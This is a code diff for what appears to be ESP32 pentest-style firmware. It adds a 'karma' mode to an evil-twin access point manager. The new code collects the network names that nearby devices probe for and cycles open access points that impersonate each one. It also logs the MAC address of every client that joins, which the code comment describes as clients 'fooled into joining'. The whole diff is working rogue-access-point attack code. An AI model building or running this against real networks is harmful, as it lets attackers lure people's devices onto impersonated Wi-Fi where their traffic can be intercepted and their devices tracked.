@@ -1,5 +1,6 @@
 #include "EvilTwinManager.h"
 #include "../storage/SdCard.h"
+#include "BeaconProbeSniffer.h"
 #include <WiFi.h>
 #include <esp_wifi.h>
 
@@ -10,11 +11,78 @@ void EvilTwinManager::begin(QueueHandle_t outQueue) {
     _outQueue = outQueue;
 }
 
+size_t EvilTwinManager::previewKarmaCandidates(std::vector<String>& out) const {
+    out.clear();
+    size_t clientCount = g_beaconProbeSniffer.clientCount();
+    BeaconProbeSniffer::ProbeClient c;
+    for (size_t i = 0; i < clientCount && out.size() < kMaxKarmaCandidates; i++) {
+        if (!g_beaconProbeSniffer.getClient(i, c)) continue;
+        for (const auto& probed : c.probedSsids) {
+            if (out.size() >= kMaxKarmaCandidates) break;
+            bool dup = false;
+            for (const auto& existing : out) {
+                if (existing == probed) {
+                    dup = true;
+                    break;
+                }
+            }
+            if (!dup) out.push_back(probed);
+        }
+    }
+    return out.size();
+}
+
+bool EvilTwinManager::startKarma(uint8_t channel) {
+    if (_running) return false;
+
+    std::vector<String> candidates;
+    if (previewKarmaCandidates(candidates) == 0) return false;  // nothing to impersonate - run BEACON/PROBE INTEL first
+
+    _karmaMode = true;
+    _karmaCandidates = candidates;
+    _karmaIndex = 0;
+    _ssid = _karmaCandidates[0];
+    _channel = channel;
+
+    if (xSemaphoreTake(_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
+        _associations.clear();
+        _seenMacs.clear();
+        xSemaphoreGive(_mutex);
+    }
+
+    // WIFI_AP_STA - same channel-sharing caveat as start() below.
+    WiFi.mode(WIFI_AP_STA);
+    bool ok = WiFi.softAP(_ssid.c_str(), /*password=*/nullptr, channel);
+    if (!ok) {
+        WiFi.mode(WIFI_STA);
+        _karmaMode = false;
+        return false;
+    }
+
+    _running = true;
+    notify("karma AP up: cycling " + String(_karmaCandidates.size()) + " candidate SSID(s), starting \"" + _ssid +
+           "\"");
+    xTaskCreatePinnedToCore(&EvilTwinManager::taskEntry, "eviltwin", 4096, this, 1, nullptr, 0);
+    return true;
+}
+
+void EvilTwinManager::advanceKarmaCandidate() {
+    if (_karmaCandidates.empty()) return;
+    _karmaIndex = (_karmaIndex + 1) % _karmaCandidates.size();
+    _ssid = _karmaCandidates[_karmaIndex];
+
+    WiFi.softAPdisconnect(true);
+    WiFi.softAP(_ssid.c_str(), /*password=*/nullptr, _channel);
+    notify("karma: now broadcasting \"" + _ssid + "\" (" + String((unsigned)(_karmaIndex + 1)) + "/" +
+           String((unsigned)_karmaCandidates.size()) + ")");
+}
+
 bool EvilTwinManager::start(const String& ssid, uint8_t channel) {
     if (_running || ssid.isEmpty()) return false;
 
     _ssid = ssid;
     _channel = channel;
+    _karmaMode = false;
     if (xSemaphoreTake(_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
         _associations.clear();
         _seenMacs.clear();
@@ -47,7 +115,13 @@ void EvilTwinManager::taskEntry(void* arg) {
 }
 
 void EvilTwinManager::run() {
+    uint32_t lastKarmaSwitchMs = millis();
     while (_running) {
+        if (_karmaMode && (millis() - lastKarmaSwitchMs) >= kKarmaDwellMs) {
+            advanceKarmaCandidate();
+            lastKarmaSwitchMs = millis();
+        }
+
         wifi_sta_list_t list;
         if (esp_wifi_ap_get_sta_list(&list) == ESP_OK) {
             for (int i = 0; i < list.num; i++) {
@@ -76,12 +150,13 @@ void EvilTwinManager::run() {
 
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_STA);
-    notify("evil twin AP stopped");
+    notify(_karmaMode ? "karma AP stopped" : "evil twin AP stopped");
 }
 
 void EvilTwinManager::logAssociation(const String& mac) {
     Association a;
     a.mac = mac;
+    a.ssid = _ssid;  // whichever SSID is currently broadcasting - the one this client was fooled into joining
     a.atMs = millis();
 
     if (xSemaphoreTake(_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
@@ -97,7 +172,7 @@ void EvilTwinManager::logAssociation(const String& mac) {
         f.close();
     }
 
-    notify("client connected: " + mac);
+    notify(_karmaMode ? ("client connected: " + mac + " -> \"" + _ssid + "\"") : ("client connected: " + mac));
 }
 
 void EvilTwinManager::notify(const String& text) {
